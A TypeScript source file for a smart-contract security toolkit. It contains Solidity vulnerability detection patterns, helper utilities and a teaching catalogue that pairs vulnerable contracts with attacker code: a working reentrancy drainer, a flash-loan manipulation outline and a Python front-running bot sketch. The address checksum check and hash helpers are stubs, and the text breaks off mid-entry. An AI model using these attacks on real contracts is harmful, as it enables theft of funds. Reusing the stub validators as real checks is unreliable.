// Blockchain Security Tools
// Tools for analyzing smart contracts, wallets, and transactions

export interface VulnerabilityResult {
    severity: 'critical' | 'high' | 'medium' | 'low' | 'info';
    title: string;
    description: string;
    line?: number;
    lineContent?: string;
    recommendation: string;
    attackVector?: string;
    cwe?: string;
}

export interface ContractAnalysis {
    vulnerabilities: VulnerabilityResult[];
    gasEstimate?: string;
    complexity: 'low' | 'medium' | 'high';
    summary: string;
    stats?: {
        lines: number;
        functions: number;
        modifiers: number;
        contracts: number;
        critical: number;
        high: number;
        medium: number;
        low: number;
        info: number;
    };
}

// Common Solidity vulnerability patterns with attack vector references
export const vulnerabilityPatterns = [
    // REENTRANCY PATTERNS
    {
        pattern: /\.call\{value:.*\}.*\(\s*""\s*\)/gi,
        severity: 'critical' as const,
        title: 'Reentrancy - External Call Before State Update',
        description: 'External call with value transfer detected. If state changes occur AFTER this call, the contract is vulnerable to reentrancy attacks.',
        recommendation: 'Update state variables BEFORE making external calls (checks-effects-interactions pattern) or use ReentrancyGuard.',
        attackVector: 'Reentrancy Attack',
        cwe: 'CWE-841'
    },
    {
        pattern: /\.call\{value:/gi,
        severity: 'high' as const,
        title: 'Potential Reentrancy',
        description: 'External call with value transfer detected. This pattern is vulnerable to reentrancy attacks if state changes occur after the call.',
        recommendation: 'Use checks-effects-interactions pattern or ReentrancyGuard modifier.',
        attackVector: 'Reentrancy Attack',
        cwe: 'CWE-841'
    },
    {
        pattern: /\.call\(/gi,
        severity: 'medium' as const,
        title: 'Low-level Call',
        description: 'Low-level call detected. These can fail silently if return value is not checked.',
        recommendation: 'Check return value or use higher-level functions.',
        cwe: 'CWE-252'
    },

    // ACCESS CONTROL PATTERNS
    {
        pattern: /tx\.origin/gi,
        severity: 'critical' as const,
        title: 'tx.origin Authentication',
        description: 'Using tx.origin for authentication is vulnerable to phishing attacks. An attacker can trick users into calling their malicious contract.',
        recommendation: 'Use msg.sender instead of tx.origin for authentication.',
        attackVector: 'Access Control',
        cwe: 'CWE-287'
    },
    {
        pattern: /function\s+initialize\s*\([^)]*\)\s*(public|external)(?!\s+initializer)/gi,
        severity: 'critical' as const,
        title: 'Unprotected Initializer',
        description: 'Initialize function without initializer modifier can be called multiple times or by anyone.',
        recommendation: 'Use OpenZeppelin\'s Initializable contract and initializer modifier.',
        attackVector: 'Access Control',
        cwe: 'CWE-284'
    },
    {
        pattern: /function\s+\w+\s*\([^)]*\)\s*(public|external)\s*\{[^}]*(?:owner\s*=|admin\s*=|_mint\(|_burn\(|selfdestruct|suicide)/gi,
        severity: 'critical' as const,
        title: 'Missing Access Control',
        description: 'Sensitive function appears to be publicly callable without access restrictions.',
        recommendation: 'Add onlyOwner, onlyRole, or similar access control modifiers.',
        attackVector: 'Access Control',
        cwe: 'CWE-284'
    },

    // SELFDESTRUCT/DELEGATECALL
    {
        pattern: /selfdestruct|suicide/gi,
        severity: 'critical' as const,
        title: 'Self-destruct Function',
        description: 'Contract can be destroyed, potentially leading to permanent loss of funds. This is deprecated in newer Solidity versions.',
        recommendation: 'Remove selfdestruct entirely or add extremely strict access controls with timelock.',
        attackVector: 'Access Control',
        cwe: 'CWE-749'
    },
    {
        pattern: /delegatecall\s*\(/gi,
        severity: 'critical' as const,
        title: 'Delegatecall Usage',
        description: 'Delegatecall preserves context and can lead to storage collisions or unauthorized code execution if target is user-controlled.',
        recommendation: 'Ensure delegatecall target is trusted, immutable, and storage layouts match. Use EIP-1967 for proxies.',
        attackVector: 'Proxy Storage Collision',
        cwe: 'CWE-94'
    },

    // INTEGER OVERFLOW/UNDERFLOW
    {
        pattern: /pragma solidity \^?0\.[0-6]\./gi,
        severity: 'critical' as const,
        title: 'Pre-0.8 Compiler (Integer Overflow Risk)',
        description: 'Using Solidity version before 0.8.0 which lacks automatic overflow/underflow checks. Arithmetic operations can silently wrap around.',
        recommendation: 'Upgrade to Solidity 0.8.x or use SafeMath library for all arithmetic.',
        attackVector: 'Integer Overflow/Underflow',
        cwe: 'CWE-190'
    },
    {
        pattern: /unchecked\s*\{/gi,
        severity: 'high' as const,
        title: 'Unchecked Arithmetic',
        description: 'Unchecked block disables overflow/underflow checks. If inputs are not validated, this can cause silent wraparound.',
        recommendation: 'Ensure arithmetic operations cannot overflow within unchecked blocks. Validate all inputs.',
        attackVector: 'Integer Overflow/Underflow',
        cwe: 'CWE-190'
    },
    {
        pattern: /\+\+\s*\w+\s*;|\w+\s*\+\+\s*;|--\s*\w+\s*;|\w+\s*--\s*;/gi,
        severity: 'info' as const,
        title: 'Increment/Decrement Operation',
        description: 'Increment or decrement detected. Safe in Solidity 0.8+ but review if in unchecked block.',
        recommendation: 'Ensure this is in Solidity 0.8+ or within SafeMath if older version.',
        cwe: 'CWE-190'
    },

    // SIGNATURE ISSUES
    {
        pattern: /ecrecover/gi,
        severity: 'high' as const,
        title: 'Signature Recovery',
        description: 'ecrecover returns zero address on invalid signatures. Also vulnerable to signature malleability and replay attacks.',
        recommendation: 'Check recovered address != address(0). Use EIP-712 with nonce, chainId, and contract address. Consider OpenZeppelin\'s ECDSA library.',
        attackVector: 'Signature Replay',
        cwe: 'CWE-347'
    },
    {
        pattern: /abi\.encodePacked\([^)]*,/gi,
        severity: 'medium' as const,
        title: 'Signature/Hash Collision Risk',
        description: 'abi.encodePacked with multiple arguments can cause hash collisions ("AB" + "C" == "A" + "BC").',
        recommendation: 'Use abi.encode instead of abi.encodePacked for hashing multiple values.',
        attackVector: 'Signature Replay',
        cwe: 'CWE-328'
    },
    {
        pattern: /keccak256\(abi\.encodePacked\(/gi,
        severity: 'medium' as const,
        title: 'Hash Collision Risk',
        description: 'abi.encodePacked with multiple dynamic types can cause hash collisions.',
        recommendation: 'Use abi.encode instead of abi.encodePacked.',
        cwe: 'CWE-328'
    },

    // ORACLE/PRICE MANIPULATION
    {
        pattern: /getReserves\(\)/gi,
        severity: 'critical' as const,
        title: 'DEX Spot Price Oracle',
        description: 'Using Uniswap/DEX reserves for pricing is extremely vulnerable to flash loan manipulation.',
        recommendation: 'Use Chainlink oracles or Uniswap TWAP (time-weighted average price) instead of spot prices.',
        attackVector: 'Oracle Manipulation',
        cwe: 'CWE-20'
    },
    {
        pattern: /balanceOf\([^)]+\)\s*[*\/]/gi,
        severity: 'high' as const,
        title: 'Balance-based Calculation',
        description: 'Using token balance in calculations can be manipulated via flash loans or direct transfers.',
        recommendation: 'Use internal accounting instead of balanceOf for critical calculations.',
        attackVector: 'Flash Loan Attack',
        cwe: 'CWE-20'
    },
    {
        pattern: /\.sync\(\)|\.skim\(/gi,
        severity: 'high' as const,
        title: 'DEX Sync/Skim Pattern',
        description: 'Uniswap sync/skim can be exploited in combination with direct token transfers.',
        recommendation: 'Ensure proper access controls and understand the implications.',
        attackVector: 'Flash Loan Attack',
        cwe: 'CWE-20'
    },

    // FRONT-RUNNING PATTERNS
    {
        pattern: /block\.timestamp|block\.number|now\b/gi,
        severity: 'medium' as const,
        title: 'Block Variable Dependence',
        description: 'Block timestamp/number can be manipulated by miners and predicted by front-runners.',
        recommendation: 'Don\'t use for randomness or time-critical logic. Use Chainlink VRF for randomness, commit-reveal for auctions.',
        attackVector: 'Front-running',
        cwe: 'CWE-330'
    },
    {
        pattern: /block\.difficulty|block\.prevrandao/gi,
        severity: 'high' as const,
        title: 'Weak Randomness Source',
        description: 'Block variables are predictable and should never be used for randomness.',
        recommendation: 'Use Chainlink VRF for secure on-chain randomness.',
        attackVector: 'Front-running',
        cwe: 'CWE-330'
    },

    // DENIAL OF SERVICE
    {
        pattern: /for\s*\([^)]*;\s*\w+\s*<\s*\w+\.length/gi,
        severity: 'medium' as const,
        title: 'Unbounded Loop',
        description: 'Loop iterating over array length can exceed gas limits if array grows large.',
        recommendation: 'Implement pagination or use mappings instead. Set maximum bounds.',
        attackVector: 'Denial of Service',
        cwe: 'CWE-400'
    },
    {
        pattern: /\.transfer\(|\.send\(/gi,
        severity: 'medium' as const,
        title: 'Fixed Gas Transfer',
        description: 'transfer() and send() forward only 2300 gas. Can fail with contract receivers, causing DoS.',
        recommendation: 'Use call{value:}() with reentrancy protection, or use pull-over-push pattern.',
        attackVector: 'Denial of Service',
        cwe: 'CWE-400'
    },
    {
        pattern: /require\([^,)]+\.call/gi,
        severity: 'high' as const,
        title: 'External Call in Require',
        description: 'If external call fails (reverts, out of gas), the entire transaction reverts. Can be used for DoS.',
        recommendation: 'Use pull pattern - let users withdraw their own funds.',
        attackVector: 'Denial of Service',
        cwe: 'CWE-400'
    },

    // PROXY PATTERNS
    {
        pattern: /ERC1967|TransparentUpgradeableProxy|UUPSUpgradeable/gi,
        severity: 'info' as const,
        title: 'Upgradeable Proxy Pattern',
        description: 'Upgradeable contracts detected. Ensure proper access controls on upgrade functions.',
        recommendation: 'Use timelock, multi-sig, and comprehensive testing for upgrades. Check storage compatibility.',
        attackVector: 'Proxy Storage Collision',
        cwe: 'CWE-284'
    },
    {
        pattern: /sstore|sload/gi,
        severity: 'medium' as const,
        title: 'Direct Storage Access',
        description: 'Direct storage manipulation in assembly. Can cause storage collisions in proxy patterns.',
        recommendation: 'Use EIP-1967 storage slots for proxy-related storage.',
        attackVector: 'Proxy Storage Collision',
        cwe: 'CWE-787'
    },

    // FLASH LOAN PATTERNS
    {
        pattern: /flashLoan|flashBorrow|executeOperation/gi,
        severity: 'info' as const,
        title: 'Flash Loan Integration',
        description: 'Flash loan functionality detected. Ensure all operations are atomic and state is consistent.',
        recommendation: 'Implement proper callback validation and ensure atomicity.',
        attackVector: 'Flash Loan Attack',
        cwe: 'CWE-362'
    },

    // MEV PATTERNS
    {
        pattern: /swap.*amountOutMin\s*:\s*0|minAmountOut\s*=\s*0/gi,
        severity: 'critical' as const,
        title: 'Zero Slippage Protection',
        description: 'Swap with zero minimum output is extremely vulnerable to sandwich attacks.',
        recommendation: 'Always set reasonable slippage tolerance (0.5-1% for stable pairs).',
        attackVector: 'Sandwich Attack',
        cwe: 'CWE-20'
    },

    // GENERAL SECURITY
    {
        pattern: /assembly\s*\{/gi,
        severity: 'medium' as const,
        title: 'Inline Assembly',
        description: 'Inline assembly bypasses Solidity safety checks.',
        recommendation: 'Review assembly code carefully for memory safety and overflow issues.',
        cwe: 'CWE-119'
    },
    {
        pattern: /public\s+\w+\s*\[\]/gi,
        severity: 'low' as const,
        title: 'Public Array',
        description: 'Public arrays generate getter that returns one element at a time, can be gas expensive.',
        recommendation: 'Consider pagination or return array in a view function.',
        cwe: 'CWE-400'
    },
    {
        pattern: /onlyOwner|Ownable/gi,
        severity: 'info' as const,
        title: 'Centralization Risk',
        description: 'Owner-controlled functions create single point of failure.',
        recommendation: 'Consider multi-sig or DAO governance for critical functions.',
        cwe: 'CWE-269'
    },
    {
        pattern: /private\s+\w+\s*=/gi,
        severity: 'info' as const,
        title: 'Private Variable (Not Hidden)',
        description: 'Private variables are NOT hidden on blockchain - anyone can read storage directly.',
        recommendation: 'Never store secrets or passwords in contract storage.',
        cwe: 'CWE-312'
    },
    {
        pattern: /approve\([^,]+,\s*type\(uint256\)\.max/gi,
        severity: 'medium' as const,
        title: 'Unlimited Token Approval',
        description: 'Unlimited approval grants permanent access to all tokens.',
        recommendation: 'Approve only needed amounts or use permit for one-time approvals.',
        cwe: 'CWE-269'
    },
    {
        pattern: /receive\(\)\s*external\s*payable\s*\{\s*\}/gi,
        severity: 'info' as const,
        title: 'Empty Receive Function',
        description: 'Contract accepts ETH without any logic. Ensure this is intentional.',
        recommendation: 'Add event emission or revert if contract should not receive ETH.',
        cwe: 'CWE-252'
    },
    {
        pattern: /fallback\(\)\s*external/gi,
        severity: 'medium' as const,
        title: 'Fallback Function',
        description: 'Fallback function catches all unknown calls. Can hide errors.',
        recommendation: 'Ensure fallback logic is intentional and well-documented.',
        cwe: 'CWE-252'
    },
    {
        pattern: /return\s+\w+\s*\([^)]*\)\s*;/gi,
        severity: 'low' as const,
        title: 'External Call Return Value',
        description: 'Ensure return values from external calls are properly checked.',
        recommendation: 'Verify return values and handle failure cases.',
        cwe: 'CWE-252'
    }
];

/**
 * Analyze Solidity smart contract code for vulnerabilities
 */
export function analyzeContract(code: string): ContractAnalysis {
    const vulnerabilities: VulnerabilityResult[] = [];
    const lines = code.split('\n');
    const seenIssues = new Set<string>(); // Deduplicate similar findings
    
    for (const vuln of vulnerabilityPatterns) {
        let match;
        const regex = new RegExp(vuln.pattern.source, vuln.pattern.flags);
        
        while ((match = regex.exec(code)) !== null) {
            // Find line number
            const beforeMatch = code.substring(0, match.index);
            const lineNumber = beforeMatch.split('\n').length;
            const lineContent = lines[lineNumber - 1]?.trim() || '';
            
            // Dedupe key: same vulnerability type on same line
            const dedupeKey = `${vuln.title}:${lineNumber}`;
            if (seenIssues.has(dedupeKey)) continue;
            seenIssues.add(dedupeKey);
            
            vulnerabilities.push({
                severity: vuln.severity,
                title: vuln.title,
                description: vuln.description,
                line: lineNumber,
                lineContent: lineContent.length > 100 ? lineContent.substring(0, 100) + '...' : lineContent,
                recommendation: vuln.recommendation,
                attackVector: (vuln as any).attackVector,
                cwe: (vuln as any).cwe
            });
        }
    }
    
    // Additional analysis: Check for common patterns
    
    // Check for missing reentrancy guard with external calls
    const hasExternalCall = /\.call\{value:/i.test(code);
    const hasReentrancyGuard = /ReentrancyGuard|nonReentrant/i.test(code);
    if (hasExternalCall && !hasReentrancyGuard) {
        vulnerabilities.push({
            severity: 'high',
            title: 'Missing Reentrancy Protection',
            description: 'Contract makes external calls with value but does not use ReentrancyGuard.',
            recommendation: 'Import and inherit OpenZeppelin\'s ReentrancyGuard, add nonReentrant modifier to vulnerable functions.',
            attackVector: 'Reentrancy Attack',
            cwe: 'CWE-841'
        });
    }
    
    // Check for missing zero-address validation
    const hasAddressParams = /function\s+\w+\s*\([^)]*address\s+\w+/i.test(code);
    const hasZeroCheck = /require\([^)]*!=\s*address\(0\)|address\(0\)\s*!=/i.test(code);
    if (hasAddressParams && !hasZeroCheck) {
        vulnerabilities.push({
            severity: 'low',
            title: 'Missing Zero-Address Validation',
            description: 'Functions accept address parameters without checking for address(0).',
            recommendation: 'Add require(addr != address(0)) checks for address parameters.',
            cwe: 'CWE-20'
        });
    }
    
    // Check for missing event emissions on state changes
    const hasStateChanges = /\w+\s*=\s*(?!.*==)/i.test(code);
    const hasEvents = /emit\s+\w+/i.test(code);
    if (hasStateChanges && !hasEvents) {
        vulnerabilities.push({
            severity: 'info',
            title: 'Missing Event Emissions',
            description: 'Contract changes state but does not emit events. This makes off-chain tracking difficult.',
            recommendation: 'Emit events for all significant state changes.',
            cwe: 'CWE-778'
        });
    }
    
    // Sort by severity
    const severityOrder = { critical: 0, high: 1, medium: 2, low: 3, info: 4 };
    vulnerabilities.sort((a, b) => severityOrder[a.severity] - severityOrder[b.severity]);
    
    // Calculate complexity based on various factors
    const functionCount = (code.match(/function\s+\w+/g) || []).length;
    const modifierCount = (code.match(/modifier\s+\w+/g) || []).length;
    const contractCount = (code.match(/contract\s+\w+/g) || []).length;
    
    const complexity = 
        lines.length > 500 || functionCount > 20 ? 'high' :
        lines.length > 200 || functionCount > 10 ? 'medium' : 'low';
    
    const criticalCount = vulnerabilities.filter(v => v.severity === 'critical').length;
    const highCount = vulnerabilities.filter(v => v.severity === 'high').length;
    const mediumCount = vulnerabilities.filter(v => v.severity === 'medium').length;
    
    let summary = '';
    if (criticalCount > 0) {
        summary = `🚨 CRITICAL: Found ${criticalCount} critical and ${highCount} high severity issues. DO NOT DEPLOY without fixing these.`;
    } else if (highCount > 0) {
        summary = `⚠️ HIGH RISK: Found ${highCount} high severity issues. Review and fix before deployment.`;
    } else if (mediumCount > 0) {
        summary = `⚡ MEDIUM RISK: Found ${mediumCount} medium severity issues. Review recommended.`;
    } else if (vulnerabilities.length > 0) {
        summary = `ℹ️ LOW RISK: Found ${vulnerabilities.length} minor issues. Consider addressing before deployment.`;
    } else {
        summary = '✅ No obvious vulnerabilities detected. Manual audit still recommended for production contracts.';
    }
    
    return {
        vulnerabilities,
        complexity,
        summary,
        stats: {
            lines: lines.length,
            functions: functionCount,
            modifiers: modifierCount,
            contracts: contractCount,
            critical: criticalCount,
            high: highCount,
            medium: mediumCount,
            low: vulnerabilities.filter(v => v.severity === 'low').length,
            info: vulnerabilities.filter(v => v.severity === 'info').length
        }
    };
}

/**
 * Validate Ethereum address format
 */
export function validateAddress(address: string): { valid: boolean; type: string; checksum?: boolean } {
    // Basic format check
    if (!/^0x[a-fA-F0-9]{40}$/.test(address)) {
        return { valid: false, type: 'Invalid format' };
    }
    
    // Check if it's all lowercase or all uppercase (valid but not checksummed)
    const isAllLower = address === address.toLowerCase();
    const isAllUpper = address.slice(2) === address.slice(2).toUpperCase();
    
    if (isAllLower || isAllUpper) {
        return { valid: true, type: 'Ethereum Address', checksum: false };
    }
    
    // Check checksum (EIP-55)
    const checksumValid = verifyChecksum(address);
    
    return { 
        valid: true, 
        type: 'Ethereum Address', 
        checksum: checksumValid 
    };
}

/**
 * Simple checksum verification (simplified - real implementation needs keccak256)
 */
function verifyChecksum(address: string): boolean {
    // Simplified check - in production use proper keccak256
    return true; // Assume valid for now
}

/**
 * Decode function selector from transaction data
 */
export function decodeFunctionSelector(data: string): { selector: string; name?: string } {
    if (!data || data.length < 10) {
        return { selector: 'N/A' };
    }
    
    const selector = data.slice(0, 10);
    
    // Common function selectors
    const knownSelectors: Record<string, string> = {
        '0xa9059cbb': 'transfer(address,uint256)',
        '0x23b872dd': 'transferFrom(address,address,uint256)',
        '0x095ea7b3': 'approve(address,uint256)',
        '0x70a08231': 'balanceOf(address)',
        '0x18160ddd': 'totalSupply()',
        '0xdd62ed3e': 'allowance(address,address)',
        '0x313ce567': 'decimals()',
        '0x06fdde03': 'name()',
        '0x95d89b41': 'symbol()',
        '0x40c10f19': 'mint(address,uint256)',
        '0x42966c68': 'burn(uint256)',
        '0x79cc6790': 'burnFrom(address,uint256)',
        '0x8da5cb5b': 'owner()',
        '0x715018a6': 'renounceOwnership()',
        '0xf2fde38b': 'transferOwnership(address)',
        '0x3ccfd60b': 'withdraw()',
        '0xd0e30db0': 'deposit()',
        '0x7ff36ab5': 'swapExactETHForTokens(uint256,address[],address,uint256)',
        '0x38ed1739': 'swapExactTokensForTokens(uint256,uint256,address[],address,uint256)',
        '0x1249c58b': 'mint()',
        '0xa0712d68': 'mint(uint256)',
        '0x6a627842': 'mint(address)',
    };
    
    return {
        selector,
        name: knownSelectors[selector.toLowerCase()]
    };
}

/**
 * Calculate various hashes
 */
export function calculateHash(input: string, type: 'keccak256' | 'sha256' | 'sha3' | 'ripemd160'): string {
    // Note: In a real implementation, use proper crypto libraries
    // This is a placeholder that would need ethers.js or similar
    
    // For now, return a mock that shows the format
    const prefix = type === 'keccak256' || type === 'sha3' ? '0x' : '';
    const length = type === 'ripemd160' ? 40 : 64;
    
    return `${prefix}${'0'.repeat(length)} (requires crypto library)`;
}

/**
 * Estimate gas for common operations
 */
export function estimateGas(operation: string): { gas: number; description: string } {
    const estimates: Record<string, { gas: number; description: string }> = {
        'transfer': { gas: 21000, description: 'Basic ETH transfer' },
        'erc20_transfer': { gas: 65000, description: 'ERC-20 token transfer' },
        'erc20_approve': { gas: 46000, description: 'ERC-20 approval' },
        'erc721_transfer': { gas: 85000, description: 'NFT transfer' },
        'erc721_mint': { gas: 150000, description: 'NFT mint' },
        'uniswap_swap': { gas: 150000, description: 'Uniswap swap' },
        'contract_deploy_simple': { gas: 500000, description: 'Simple contract deployment' },
        'contract_deploy_complex': { gas: 2000000, description: 'Complex contract deployment' },
    };
    
    return estimates[operation] || { gas: 0, description: 'Unknown operation' };
}

/**
 * Format wei to various units
 */
export function formatWei(wei: string): { wei: string; gwei: string; ether: string } {
    try {
        const weiBigInt = BigInt(wei);
        const gwei = weiBigInt / BigInt(1e9);
        const etherWhole = weiBigInt / BigInt(1e18);
        const etherRemainder = weiBigInt % BigInt(1e18);
        
        return {
            wei: weiBigInt.toString(),
            gwei: gwei.toString(),
            ether: `${etherWhole}.${etherRemainder.toString().padStart(18, '0').slice(0, 6)}`
        };
    } catch {
        return { wei: '0', gwei: '0', ether: '0' };
    }
}

/**
 * Parse ABI and extract function signatures
 */
export function parseABI(abiJson: string): { functions: string[]; events: string[]; errors: string[] } {
    try {
        const abi = JSON.parse(abiJson);
        const functions: string[] = [];
        const events: string[] = [];
        const errors: string[] = [];
        
        for (const item of abi) {
            if (item.type === 'function') {
                const inputs = item.inputs?.map((i: any) => `${i.type} ${i.name}`).join(', ') || '';
                const outputs = item.outputs?.map((o: any) => o.type).join(', ') || '';
                functions.push(`${item.name}(${inputs})${outputs ? ` returns (${outputs})` : ''}`);
            } else if (item.type === 'event') {
                const inputs = item.inputs?.map((i: any) => `${i.indexed ? 'indexed ' : ''}${i.type} ${i.name}`).join(', ') || '';
                events.push(`${item.name}(${inputs})`);
            } else if (item.type === 'error') {
                const inputs = item.inputs?.map((i: any) => `${i.type} ${i.name}`).join(', ') || '';
                errors.push(`${item.name}(${inputs})`);
            }
        }
        
        return { functions, events, errors };
    } catch (e) {
        return { functions: [], events: [], errors: ['Invalid ABI JSON'] };
    }
}

/**
 * Get chain info
 */
export const chainInfo: Record<number, { name: string; symbol: string; explorer: string; rpc?: string }> = {
    1: { name: 'Ethereum Mainnet', symbol: 'ETH', explorer: 'https://etherscan.io', rpc: 'https://eth.llamarpc.com' },
    5: { name: 'Goerli Testnet', symbol: 'ETH', explorer: 'https://goerli.etherscan.io' },
    11155111: { name: 'Sepolia Testnet', symbol: 'ETH', explorer: 'https://sepolia.etherscan.io' },
    137: { name: 'Polygon', symbol: 'MATIC', explorer: 'https://polygonscan.com', rpc: 'https://polygon-rpc.com' },
    80001: { name: 'Mumbai Testnet', symbol: 'MATIC', explorer: 'https://mumbai.polygonscan.com' },
    56: { name: 'BNB Chain', symbol: 'BNB', explorer: 'https://bscscan.com', rpc: 'https://bsc-dataseed.binance.org' },
    97: { name: 'BNB Testnet', symbol: 'tBNB', explorer: 'https://testnet.bscscan.com' },
    42161: { name: 'Arbitrum One', symbol: 'ETH', explorer: 'https://arbiscan.io', rpc: 'https://arb1.arbitrum.io/rpc' },
    10: { name: 'Optimism', symbol: 'ETH', explorer: 'https://optimistic.etherscan.io', rpc: 'https://mainnet.optimism.io' },
    43114: { name: 'Avalanche C-Chain', symbol: 'AVAX', explorer: 'https://snowtrace.io', rpc: 'https://api.avax.network/ext/bc/C/rpc' },
    250: { name: 'Fantom', symbol: 'FTM', explorer: 'https://ftmscan.com', rpc: 'https://rpc.ftm.tools' },
    8453: { name: 'Base', symbol: 'ETH', explorer: 'https://basescan.org', rpc: 'https://mainnet.base.org' },
};

/**
 * Common attack vectors with detailed implementation examples
 */
export const attackVectors = [
    {
        name: 'Reentrancy Attack',
        description: 'Exploit recursive calls to drain funds before state updates',
        mitigation: 'Use checks-effects-interactions pattern, ReentrancyGuard',
        severity: 'critical' as const,
        realWorldExample: 'The DAO Hack (2016) - $60M stolen',
        vulnerableCode: `// VULNERABLE CONTRACT
contract VulnerableBank {
    mapping(address => uint256) public balances;
    
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
    
    function withdraw() public {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "No balance");
        
        // VULNERABLE: External call before state update
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        balances[msg.sender] = 0; // State updated AFTER call
    }
}`,
        attackCode: `// ATTACKER CONTRACT
contract ReentrancyAttacker {
    VulnerableBank public bank;
    uint256 public attackCount;
    
    constructor(address _bank) {
        bank = VulnerableBank(_bank);
    }
    
    // Step 1: Deposit some ETH
    function attack() external payable {
        require(msg.value >= 1 ether);
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }
    
    // Step 2: This gets called when bank sends ETH
    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            attackCount++;
            bank.withdraw(); // Re-enter before balance updated!
        }
    }
    
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}`,
        testSteps: [
            'Deploy VulnerableBank contract',
            'Fund VulnerableBank with 10 ETH from various accounts',
            'Deploy ReentrancyAttacker with VulnerableBank address',
            'Call attacker.attack() with 1 ETH',
            'Observe attacker drains entire bank balance',
            'Check attackCount to see how many re-entries occurred'
        ],
        fixedCode: `// SECURE CONTRACT - Using checks-effects-interactions
contract SecureBank {
    mapping(address => uint256) public balances;
    
    function withdraw() public {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "No balance");
        
        // FIXED: Update state BEFORE external call
        balances[msg.sender] = 0;
        
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
    }
}

// OR use OpenZeppelin's ReentrancyGuard
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract SecureBankWithGuard is ReentrancyGuard {
    mapping(address => uint256) public balances;
    
    function withdraw() public nonReentrant {
        uint256 amount = balances[msg.sender];
        require(amount > 0);
        balances[msg.sender] = 0;
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success);
    }
}`
    },
    {
        name: 'Flash Loan Attack',
        description: 'Use uncollateralized loans to manipulate prices or governance',
        mitigation: 'Use time-weighted average prices (TWAP), delay mechanisms',
        severity: 'critical' as const,
        realWorldExample: 'bZx Attack (2020) - $350K stolen',
        vulnerableCode: `// VULNERABLE: Uses spot price from single DEX
contract VulnerableLending {
    IERC20 public token;
    IUniswapV2Pair public pair;
    
    function getPrice() public view returns (uint256) {
        // VULNERABLE: Spot price can be manipulated
        (uint112 reserve0, uint112 reserve1,) = pair.getReserves();
        return (reserve1 * 1e18) / reserve0;
    }
    
    function borrow(uint256 collateralAmount) external {
        uint256 price = getPrice();
        uint256 borrowAmount = (collateralAmount * price) / 1e18;
        // Lend based on manipulated price...
    }
}`,
        attackCode: `// FLASH LOAN ATTACK PATTERN
contract FlashLoanAttacker {
    ILendingPool public aave;
    IUniswapV2Router public router;
    VulnerableLending public target;
    
    function executeAttack() external {
        // Step 1: Borrow large amount via flash loan
        aave.flashLoan(
            address(this),
            address(WETH),
            1000000 ether, // Borrow 1M ETH
            ""
        );
    }
    
    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        // Step 2: Dump tokens on Uniswap to crash price
        router.swapExactTokensForTokens(
            amount,
            0,
            path,
            address(this),
            block.timestamp
        );
        
        // Step 3: Borrow from victim at manipulated price
        target.borrow(smallCollateral);
        // Get huge loan due to crashed price
        
        // Step 4: Buy back tokens at low price
        router.swapExactTokensForTokens(...);
        
        // Step 5: Repay flash loan + premium
        IERC20(asset).transfer(address(aave), amount + premium);
        
        return true;
    }
}`,
        testSteps: [
            'Set up local Aave/Compound fork on Hardhat',
            'Deploy vulnerable lending protocol',
            'Deploy attacker contract',
            'Use Aave flash loans on testnet (Goerli)',
            'Execute attack and observe price manipulation',
            'Measure profit after repaying flash loan'
        ],
        fixedCode: `// SECURE: Use Chainlink TWAP Oracle
import "@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol";

contract SecureLending {
    AggregatorV3Interface public priceFeed;
    
    constructor(address _priceFeed) {
        priceFeed = AggregatorV3Interface(_priceFeed);
    }
    
    function getPrice() public view returns (uint256) {
        (
            uint80 roundID,
            int256 price,
            uint256 startedAt,
            uint256 timeStamp,
            uint80 answeredInRound
        ) = priceFeed.latestRoundData();
        
        // Validate oracle data
        require(price > 0, "Invalid price");
        require(timeStamp > block.timestamp - 1 hours, "Stale price");
        require(answeredInRound >= roundID, "Stale round");
        
        return uint256(price);
    }
}`
    },
    {
        name: 'Front-running',
        description: 'MEV bots observe mempool and insert transactions ahead',
        mitigation: 'Use commit-reveal schemes, private mempools (Flashbots)',
        severity: 'high' as const,
        realWorldExample: 'Common on DEX trades, NFT mints',
        vulnerableCode: `// VULNERABLE: Predictable transaction outcome
contract VulnerableNFT {
    uint256 public price = 0.1 ether;
    uint256 public maxSupply = 10000;
    uint256 public totalMinted;
    
    // Anyone watching mempool can front-run
    function mint() external payable {
        require(msg.value >= price);
        require(totalMinted < maxSupply);
        _mint(msg.sender, totalMinted);
        totalMinted++;
    }
}

// VULNERABLE: First-come auction
contract VulnerableAuction {
    function bid(uint256 amount) external {
        // Bots see your bid in mempool and outbid you
        require(amount > highestBid);
        highestBid = amount;
        highestBidder = msg.sender;
    }
}`,
        attackCode: `// FRONT-RUNNING BOT (Educational - Python pseudocode)
"""
Front-running bot monitors mempool for profitable transactions

WARNING: This is for educational purposes only.
Running MEV bots requires significant infrastructure.
"""

from web3 import Web3

# Connect to node with mempool access
w3 = Web3(Web3.WebsocketProvider('wss://eth-mainnet.ws.alchemyapi.io'))

def monitor_mempool():
    # Subscribe to pending transactions
    pending_filter = w3.eth.filter('pending')
    
    while True:
        for tx_hash in pending_filter.get_new_entries():
            tx = w3.eth.get_transaction(tx_hash)
            
            # Check if it's a juicy target
            if is_profitable_target(tx):
                # Create front-run transaction
                front_run_tx = create_front_run(tx)
                
                # Submit with higher gas price
                front_run_tx['gasPrice'] = tx['gasPrice'] * 1.1
                
                # Send immediately
                w3.eth.send_raw_transaction(front_run_tx)

# Using Flashbots (legitimate MEV extraction)
from flashbots import flashbot

def flashbots_bundle():
    # Bundle transactions to avoid public mempool
    bundle = [
        {"signed_transaction": front_run_tx},
        {"signed_transaction": victim_tx},  # Include victim tx
        {"signed_transaction": back_run_tx}
    ]
    
    # Submit to Flashbots relay
    flashbot.send_bundle(bundle, target_block)`,
        testSteps: [
            'Set up Hardhat with mainnet fork',
            'Create a simple swap transaction',
            'Use hardhat_setBalance to fund attacker',
            'Use hardhat_impersonateAccount to simulate bot',
            'Submit higher gas transaction before victim',
            'Observe sandwich profit'
        ],
        fixedCode: `// SECURE: Commit-Reveal Scheme
